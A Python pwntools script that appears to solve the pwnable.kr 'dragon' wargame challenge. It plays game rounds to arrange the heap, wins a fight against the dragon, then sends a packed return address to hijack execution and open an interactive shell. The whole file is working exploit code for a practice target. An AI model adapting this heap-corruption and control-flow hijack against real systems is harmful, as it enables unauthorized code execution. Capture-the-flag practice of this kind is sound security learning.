#!/usr/bin/env python3
from pwn import *
import struct

def until_print(io, until):
    print(str(io.recvuntil(until), 'utf-8'))

def knight_suicide_with_mama(io):
    print('knight_suicide_with_mama')

    io.sendline('2') # choosing knight

    io.sendline('2')
    io.sendline('2')
    until_print(io, '[ 2 ] Knight')

def knight_suicide_with_baby(io):
    print('knight_suicide_with_baby')

    io.sendline('2') # choosing knight
    io.sendline('2')
    until_print(io, '[ 2 ] Knight')

def priest_suicide_with_baby(io):
    print('priest_suicide_with_baby')

    io.sendline('1') # choosing priest

    # basically looking for suicide here
    for i in range(0, 2):
        until_print(io, 'You Become Temporarily Invincible.')
        io.sendline('1') # holy bolt

io = remote('pwnable.kr', 9004)
until_print(io, '[ 2 ] Knight')


# maybe preparing the heap a little bit
# maybe that will work
# dont want to debug so...
knight_suicide_with_baby(io)
knight_suicide_with_mama(io)
knight_suicide_with_baby(io)
knight_suicide_with_mama(io)
priest_suicide_with_baby(io) # creating a hole
knight_suicide_with_mama(io)
knight_suicide_with_baby(io)

# stopping at priest with mama duel
until_print(io, 'You Have Been Defeated!')

io.sendline('1') # choosing priest
until_print(io, 'You Become Temporarily Invincible.')

killed_dragon = False

while True:
    io.sendline('3')
    io.sendline('3')
    io.sendline('2')
    data = io.recv(4096)

    print(data)

    if b'Well Done Hero!' in data:
        break


addr = struct.pack('<I', 0x08048DBF)

# should be enough to also put one
# but just to be safe
# cause im too lazy to debug
# will only debug if it wont work
io.send(addr * 4)
io.interactive()
io.close()